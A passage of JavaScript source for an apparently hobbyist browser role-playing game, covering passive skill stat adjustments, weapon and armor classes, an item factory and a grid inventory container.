          else if(a.effect == enums.skillEffect.ATKSPEEDBOOST){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.atkSpeedBoost += user.atkSpeedBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.atkSpeedBoost += a.value;
            }
          }
          else if(a.effect == enums.skillEffect.EVASIONBOOST){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.evasionBoost += user.evasionBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.evasionBoost += a.value;
            }
          }
          else if(a.effect == enums.skillEffect.CRITDMG){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.critDamage += user.critDamageBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.critDamage += a.value;
            }
          }
          else if(a.effect == enums.skillEffect.CRITCHANCE){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.critChance += user.critChanceBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.critChance += a.value;
            }
          }
          else if(a.effect == enums.skillEffect.DMGREFLECT){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.dmgReflect += user.dmgReflectBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.dmgReflect += a.value;
            }
          }
          else if(a.effect == enums.skillEffect.SPEEDBST){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.speedCur += user.speedBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.speedCur += a.value;
            }
          }
          else if(a.effect == enums.skillEffect.MAGICIMMUNITY){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.magicImmunity += user.magicImmunityBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.magicImmunity += a.value;
            }
          }
          else if(a.effect == enums.skillEffect.PHYSICALIMMUNITY){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.physicalImmunity += user.physicalImmunityBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.physicalImmunity += a.value;
            }
          }
          else if(a.effect == enums.skillEffect.BLOCKCHANCE){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.blockChance += user.blockChanceBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.blockChance += a.value;
            }
          }
    }
  };
  this.takeOff = function(user, slot) {
    if(!user.skills[slot] || slot>3) return;
    user.skills[slot] = 0;
    for(var i=0; i<this.abilities.length; i++){
      var a = this.abilities[i]
      if(a.type == enums.skillType.PASSIVE){
        if(a.target == enums.skillTarget.SELF){
          if(a.effect == enums.skillEffect.HEAL){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.healthRegen -= user.healthRegenBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.healthRegen -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.DMGBOOST){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.dmgMod -= user.dmgModBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.dmgMod -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.LIFESTEAL){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.lifeSteal -= user.lifeStealBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.lifeSteal -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.ATKSPEEDBOOST){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.atkSpeed -= user.atkSpeedBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.atkSpeed -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.EVASIONBOOST){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.evasion -= user.evasionBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.evasion -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.CRITDMG){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.critDamage -= user.critDamageBase * a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.critDamage -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.CRITCHANCE){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.critChance -= user.critChanceBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.critChance -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.DMGREFLECT){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.dmgReflect -= user.dmgReflectBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.dmgReflect -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.SPEEDBST){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.speedCur -= user.speedBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.speedCur -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.MAGICIMMUNITY){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.magicImmunity -= user.magicImmunityBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.magicImmunity -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.PHYSICALIMMUNITY){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.physicalImmunity -= user.physicalImmunityBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.physicalImmunity -= a.value;
            }
          }
          else if(a.effect == enums.skillEffect.BLOCKCHANCE){
            if(a.enums.valueType == enums.valueType.PERCENT){
              user.blockChance -= user.blockChanceBase*a.value;
            }
            else if(a.enums.valueType == enums.valueType.STATIC){
              user.blockChance -= a.value;
            }
          }
      }
    }
    }
    console.log('user: %o', user);
};
  this.activate = function() {
    this.lastUseTime = new Date().getTime();
    if(this.ready)
      console.log('skill use');
    else
      console.log('on cooldown');
  };
  this.update = function() {
    (frameTime - this.lastUseTime > this.cooldown)?(this.ready = true):(this.ready = false);

  };

}

// [{type: enums.skillType.INSTANT, target: enums.skillTarget.SELF, effect: enums.skillEffect.HEAL, value: 35, enums.valueType: enums.valueType.STATIC, duration: 0}]);


Weapon.prototype = Object.create(Item.prototype);
Weapon.prototype.constructor = Weapon;
function Weapon(id, name, stackable, quantity, type, level, damageMin, damageMax, damageMod, speedMod, range, hitrateMod, armorPenetration){
  Item.call(this, id, name, stackable, quantity, type);
  this.level = level;
  this.damageMin = damageMin;
  this.damageMax = damageMax;
  this.damageMod = damageMod;
  this.speedMod = speedMod;
  this.range = range;
  this.hitrateMod = hitrateMod;
  this.armorPenetration = armorPenetration;
}

Armor.prototype = Object.create(Item.prototype);
Armor.prototype.constructor = Armor;
function Armor(id, name, stackable, quantity, type, rating, dmgred){
  Item.call(this, id, name, stackable, quantity, type);
  this.rating = rating;
  this.dmgReduction = dmgred;
}
function ItemFactory(){
  this.curId = 0;
  this.createWeapon = function(name, type, level, damageMin, damageMax, damageMod, speedMod, range, hitrateMod, armorPenetration){
    var name = name || 'default name'
    var type = type || 'sword';
    var damageMin = damageMin || 0;
    var damageMax = damageMax || 0;
    var damageMod = damageMod || 0;
    var speedMod = speedMod || 0;
    var range = range || 1.45;
    var hitrateMod = hitrateMod || 0;
    var armorPenetration = armorPenetration || 0;
    var stackable = false;
    var quantity = 1;
    return (new Weapon(this.curId++, name, stackable, quantity, type, level, damageMin, damageMax, damageMod, speedMod, range, hitrateMod, armorPenetration));
  }
  this.getWeaponFromTemplate = function(which){
    var t = weaponTemplates[which];
        return (new Weapon(
          this.curId++,
          t.name,
          t.stackable,
          t.quantity,
          t.type,
          t.level,
          t.damageMin,
          t.damageMax,
          t.damageMod,
          t.speedMod,
          t.range,
          t.hitrateMod,
          t.armorPenetration));
  }
  this.createMoney = function(quantity){
    var stackable = true;
    return (new Item(this.curId++, 'gold', stackable, quantity, itemType.GOLD));
  }
  this.createArmor = function(level){
    var stackable = false;
    var quantity = 1;
    var rating = level;
    var dmgred = 0;
    return (new Armor(this.curId++, 'armor', stackable, quantity, itemType.ARMOR, rating, dmgred));
  }
  this.createSkill = function(array, cooldown){
    var abilities = array;
    var cooldown = cooldown * 1000;


    var stackable = false;
    var quantity = 1;
    return (new Skill(this.curId++, 'skill_test', stackable, quantity, itemType.SKILL, abilities, cooldown));
  }
}

//example of a skill being created with ItemFactory. one instant heal with a 40s cooldown.
// var test = ifac.createSkill([{type: enums.skillType.INSTANT, target: enums.skillTarget.SELF, effect: enums.skillEffect.HEAL, value: 35, enums.valueType: enums.valueType.STATIC, duration: 0}], 10);
// var test_passive = ifac.createSkill([{type: enums.skillType.PASSIVE, target: enums.skillTarget.SELF, effect: enums.skillEffect.HEAL, value: 20, enums.valueType: enums.valueType.STATIC, duration: 0}], 0);

function Container(size_x, size_y, name, parent_container){
  this.name = name || 'container';
  this.w = size_x || 4;
  this.h = size_y || 5;
  this.contents = [];
  for(var i=0; i<this.w; i++){
    this.contents[i] = [];
    for(var j=0; j<this.h; j++){
      this.contents[i][j] = 0;
    }
  }
  this.addItem = function(item, position){
    console.time('dicks: ')
    if(position == -1  || !item) return;
    var position = position || [0, 0];
    var s = this.contents[position[0]][position[1]];
    if(s){//if slot is taken
      if(s.name == item.name && s.stackable){
        this.stackItems(s, item);
        return;
      }
      position = this.getFirstEmptySlot();
    }
    if(position == -1) return;
    this.contents[position[0]][position[1]] = item;
    console.timeEnd('dicks: ');
  }

  this.getFirstEmptySlot = function(){
    for(var i=0; i<this.h; i++){
      for(var j=0; j<this.w; j++){
        if(!this.contents[j][i])
          return [j, i];
      }
    }
    return (-1);
  }
  this.stackItems = function(item1, item2){
    item1.quantity += item2.quantity;
    console.log('stacking (implement max stack size)');
  }
}